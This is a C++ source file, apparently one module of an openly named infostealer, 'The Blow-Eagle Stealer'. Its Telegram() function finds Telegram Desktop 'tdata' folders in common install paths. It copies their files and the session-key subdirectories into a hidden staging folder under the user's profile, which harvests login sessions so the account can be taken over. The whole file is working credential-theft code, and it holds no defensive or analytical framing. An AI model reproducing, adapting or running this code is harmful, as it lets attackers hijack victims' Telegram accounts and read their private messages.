/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.h"
#include "../../config/config.c"
#include  "../../helper/helper.h"
#include <cctype> 

bool hasLowerCase(const std::string& str)
{
	for (char c : str)
	{
		if (islower(c))
		{
			return true;
		}
		if (isdigit(c))
		{
			return false;
		}
	}
	return false;
}

void messengers::Telegram()
{
	printf("Telegram\n");
	std::string user = func::GetUser();

	std::string paths[] =
	{
		"D:/Telegram Desktop/tdata",
		"C:/Users/" + user + "/AppData/Roaming/Telegram Desktop/tdata",
		"C:/Program Files/Telegram Desktop/tdata"
	};

	for (size_t i = 0; i < std::size(paths); i++)
	{
		if (std::filesystem::exists(paths[i]))
		{
			std::cout << paths[i] << "\n";

			std::string defaultPaths[] = {

		"C:/Users/" + user + config::path + "/Messengers",
		"C:/Users/" + user + config::path + "/Messengers/Telegram_"+ std::to_string(i),

			};

			for (size_t j = 0; j < std::size(defaultPaths); j++)
			{
				int result = _mkdir(defaultPaths[j].c_str());


			}

			int arrSize = 0;
			std::string* filesInDir = new std::string[arrSize];

			func::GetFilesInDir(paths[i], filesInDir, arrSize);

			/*for (size_t x = 0; x < arrSize; x++)
			{

				cout <<
			}*/
			try
			{
				for (size_t x = 0; x < arrSize; x++)
				{

					func::copyFile(paths[i] + '/' + filesInDir[x], defaultPaths[1]);
				}
			}
			catch (const char* error_message)
			{
				std::cout << error_message << std::endl;
			}



			arrSize = 0;
			filesInDir = new std::string[arrSize];

			func::GetDirectories(paths[i], filesInDir, arrSize);

			try
			{
				for (size_t y = 0; y < arrSize; y++)
				{
					if (!hasLowerCase(filesInDir[y]))
					{
						std::string createfPath = defaultPaths[1] + '/' + filesInDir[y];

						int result = _mkdir(createfPath.c_str());

						func::copyDirectory(paths[i] + '/' + filesInDir[y], createfPath);
					}
				}
			}
			catch (const char* error_message)
			{
				std::cout << error_message << std::endl;
			}




		}
	}

}